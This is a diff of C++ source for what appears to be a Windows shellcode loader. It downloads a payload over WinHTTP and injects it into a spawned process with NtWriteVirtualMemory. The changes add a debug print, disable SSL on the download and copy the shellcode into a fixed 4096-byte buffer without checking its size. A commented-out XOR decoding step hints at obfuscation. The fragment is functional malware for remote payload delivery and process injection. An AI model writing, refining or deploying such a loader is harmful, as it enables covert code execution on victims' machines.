@@ -125,6 +125,9 @@ int main()
 #endif
 
     unsigned int shellcode_size = (unsigned int)shellcode.size();
+#ifdef DEBUGGING
+	printf("Shellcode size is %d\n", shellcode_size);
+#endif
 
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
@@ -165,9 +168,12 @@ int main()
 #endif
     }
 
+	unsigned char buf[4096];
+	memcpy(buf, &shellcode[0], shellcode_size);
+
     // do_xor(encoded_kwdikas, sizeof(encoded_kwdikas), key, sizeof(key));
     // Copy shellcode into allocated memory
-    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)&shellcode[0], shellcode_size, 0);
+    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
     if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
         fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %d\n", ntstatus);
@@ -237,8 +243,8 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
-//        0); // no ssl
-        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+        0); // no ssl
+//        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
 
         // create session for target
     HINTERNET hConnect = WinHttpConnect(
